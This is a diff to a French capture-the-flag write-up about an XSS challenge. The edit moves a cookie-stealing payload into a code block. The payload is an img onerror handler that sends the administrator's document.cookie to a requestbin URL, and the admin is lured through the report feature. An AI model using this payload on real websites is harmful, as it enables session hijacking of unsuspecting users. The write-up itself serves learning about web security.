@@ -42,7 +42,10 @@ Tout de suite, je pense à une XSS où il va falloir voler le cookie de l'admini
 Sans surprise, l'alert apparaît.
 
 Pour récupérer le cookie, il va falloir un hook sur lequel effectuer une requête contenant le cookie de l'administrateur. Pour cela, j'ai utilisé [requestbin](http://requestbin.net/).  
-Le payload est triviale : `<img src=x onerror="this.src='http://requestbin.net/r/xxxxxxxx/?'+document.cookie; this.removeAttribute('onerror');">`.  
+Le payload est triviale : 
+```javascript
+<img src=x onerror="this.src='http://requestbin.net/r/xxxxxxxx/?'+document.cookie; this.removeAttribute('onerror');">`.  
+```
 Une fois le post envoyé, on récupère son ID et on la renseigne dans l'onglet **Report** afin qu'un administrateur vienne jeter un œil à notre post. On attend quelques secondes et une requête est effectuée sur notre hook, avec dans l'URL, le **nom** et la **valeur** du cookie.  
 
 ![Challenge](/img/angstrom_2020_xmas_get.png){: .center-image}
